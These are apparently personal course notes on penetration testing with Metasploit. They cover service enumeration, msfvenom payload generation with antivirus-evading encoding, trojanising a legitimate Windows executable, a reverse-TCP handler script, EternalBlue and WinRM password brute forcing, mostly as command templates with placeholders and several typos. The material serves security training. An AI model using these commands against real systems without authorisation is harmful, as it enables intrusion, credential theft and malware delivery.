Metasploit Framework Overview

- Introduction to the Metasploit Framework
    - Open source, penetration testing and exploitation framework 
    - Provides infraestructure for automation
    - Terminology
        - Interface: methods of interacting with msf
        - Module: piece of code that performs a particular task
        - Exploit: piece of code or module used to take advantage of a vulnerability
        - Paylaod: piece of code delivered to the targer system by an exploit
        - Listener: utility that listens for an incoming connection from a target
    - Interfaces:
        - msfconsole
        - msfcli
        - Metasploit community edition
        - Armitage

- Metasploit Framework architecture
    - MSF modules:  
        - Exploit: a module that is used to take advantage of a vulnerability, typically paired with a payload
        - Payload: code that is delivered by MSF and remotely executed on the target
        - Encoder: used to avoid AV detection
        - NOPS: Used to ensure payload sizes are consistent
        - Auxiliary: module used yo perform additional functionality like port scanning and enumeration
    - MSF payload types:
        - Non staged payload: sent to the target as is 
        - Staged payload: sento to the target in two parts (stager + stage)
            - Stagers: used to establish a stable communication channel between attacker and target
            - Stage: payload components downloaded by the stager
        - Meterpreter payload: executed in memory, it communicates over a stager socket and provides an attacker with a command interpreter
        - MSF file system:
            - Modules: /usr/share/metasploit-framework/modules
            - User Modules: ~/.ms4/modules

- Penetration testing with the Metasploit Framework
    - PTES: Penetration Testing Execution Standard
        - Information gathering
        - Enumeration
        - Exploitation
        - Post-Exploitation
            - Privilege Escalation
            - Persistence 
            - Clearing tracks

Metasploit fundamentals

- Installing and configuring The Metasploit Framework
    - MSFDB: postgresql service is required

- MSFConsole fundamentals
    - MSF modules might require variables like the target IP and port to run successfully
    - show <exploits/modules/payloads...>
    - set payload windows/meterpreter/reverse_tcp
    - search

- Creating and managing workspaces
    - Workspaces allow to keep track of all the hosts, scans and activities 
    - workspace -a <name>
    - workspace <name>

- Port scanning with auxiliary modules (LAB)
    - part 1    
        - search portscan
        - use <name>
        - show options
        - set RHOSTS <ip>
        - run
        - search <web_app_name>
        - exploit
    - meterpreter
        - shell
        - /bin/bash -i
        - run autoroute -s <ip>
        - background
        - sessions   
    - setg <variable> to set global variable in metasploit 
    - loot
    - creds

- FTP enumeration
    - FTP: file transfer protocol
    - TCP port 21
    - Used frequently to transfer files between a directory to a web server
    - search type:auxiliary name:ftp 
    - ftp <ip> 
    - version, shares, users, anonymous login...

- SMB enumeration
    - Network sharing protocol over LAN networks
    - TCP port 445
    - SAMBA is the Linux implementation of SMB
    - search type:auxiliary name:smb 
    - smbclient -L \\\\<ip>\\ -U <user>
    - smbclient \\\\<ip>\\<share_name> -U <user> 
    - rpcclient -U "" -N <ip>
    - nmblookup -A demo.ine.local
    - version, shares, users, anonymous login...

- WEB server enumeration
    - Web servers use HTTP/S
    - TCP port 80,443
    - search type:auxiliary name:http
    - version, headers, robots.txt, directories, files, users

- MySQL enumeration
    - Open source relational database
    - TCP port 3306
    - search type:auxiliary name:mysql
    - version, credentials (brute force), accounts, mysql_sql, mysql_schema
    - SQLs
        - show databases;
        - use <database>;
        - show tables;
    - mysql -h <ip> -u <user> -p

- SSH enumeration
    - Remote administration protocol, typically used to access servers and systems
    - TCP port 22
    - search type:auxiliary name:ssh
    - version, credentials (brute force), users

- SMTP enumeration
    - Simple, mail transfer protocol
    - TCP port 25 or 465 or 587
    - search type:auxiliary name:stmp
    - version, users, 
    - nc <ip> <port>
        - VRFY <name>@<domain>

- Vulnerability scanning with metasploit
    - Process of scanning and detecting vulnerabilites and verifying wether they can be exploited
    - db_nmap -sS -sV -O <ip>
    - search type:exploit name:Microsoft IIS
    - set payload windows/meterpreter/reverse_tcp
    - searchsploit <service>
    - metasploit-autopwn
    - db_autopwn -p -t -PI <port>
    - analyze

- Vulnerability scanning with Nessus
    - Propietary vulnerability scanner
    - We can scan a target and then import the results to metasploit
    - Host discovery + port scanner + service and version scan + vulnerability scan
    - Nessus Essentials allows for 16 IPs to be scanned

- Web App Vulnerability scanning with WMAP
    - WMAP is available as an MSF plugin and can be loaded directly into mestasploit
    - When using metasploit:
        - load wmap 
        - wmap_*
        - wmap_sites -a <ip>
        - wmap_target -t http://<ip>/
        - wmap_run -t
        - wmap_run -e

Client-Side Attacks

- Generating Payloads with MSFVenom
    - Client-side attack: attack vector that involves coercing a client to execute a malicious payload
    - Typically uses social engineering
    - CS attacks take advantage of human vulnerabilites
    - MSFVenom is a command-line utility to generate and ecode payloads
    - msfvenom --list payloads
    - msfvenom --list formats
    - msfvenom -a <architecture> -p <payload> VAR=VAL -f <format>

- Encoding payloads with msfvenom
    - We need to be cognisant of anti-virus detection
    - Most AV use signature based detection
    - Encoding can help avoiding detection
    - Shellcode is code that provides an attacker with a remote shell (payload)
    - msfvenom -a <architecture> -p <payload> VAR=VAL -f <format> -i <iterations> -e <encoder>

- Injecting payloads into Windows portable executables
    - msfvenom -p <payload> VAR=VAL -f <format> -x <legitimate .exe file> -k
    - meterpreter:  
        - run post/windows/manage/migrate 

Automating

- Automating Metasploit with resource scripts
    - Resource script allow to automate repetitive tasks and commands
    - They operate similar to batch scripts in Windows
    - Setup handler.rc
        use multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 1.1.1.1
        set LPORT 1234
        run
    - msfconsole -r resource_script.rc
    - In msfconsole
        - resource resource_script.rc
        - makerc new_script.rc

Windows Exploitation

- Exploiting a vulnerable HTTP File Server
    - HFS is a web server that is designed for file and document sharing
    - Typically run on TCP port 80
    
- Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)
    - Takes advantage of a vulnerability that allows to send specially crafted packets
    - Targets SMB version 1
    - It affects multiple windows versions
    - MSF has a module to check if a system is vulnerable
    - nmap -sV -p 445 --script=smb-vuln-ms17-010 <ip>
    - Manual exploitation with AutoBlue-MS17-010
    - Automatic exploitation with msfconsole
        - search eternalblue
        - exploit

- Exploiting WinRM
    - Windows remote management that can be used to remote access to systems over HTTPS
    - Tipically uses TCP port 5985 and 5986
    - crackmapexec (brute-force)
        - crackmapexec winrm <IP> -u administrator -p <password_wordlist>
        - crackmapexec winrm <IP> -u administrator -p <password> -x "<command>"
    - evil-winrm (ruby script to get a session)
        - evil-winrm.rb -u administrator -p <password> -i <IP> 

- Exploiting a vulenrable Apache Tomcat web server
    - Apache Tomcat is used to host dynamic websites or web apps developed in Java
    - HTTP Server TCP port 8080
    - search specific windows file dir C:\Windows\System32\*.txt /s /b

Linux Exploitation

- Exploiting a Vulnerable FTP Server
    - FTP is file transfer protocol TCP port 21
    - Used to transfer website files to and from a server

- Exploiting Samba
    - TCP port 445
    - SAMBA is the Linux implementation of SMB

- Exploiting a Vulnerable SSH Server
    - Secure shell TCP port 22

- Exploiting a Vulnerable SMTP Server
    - Sunoke Nauk Transfer Protocol
    - TCP port 25, 465 and 587
    - Haraka is a high performance SMTP server developed in node.js 

- RSYNC
    - rsync rsync://target1.ine.local
    - rsync -av rsync://target1.ine.local/backupwscohen/ .
    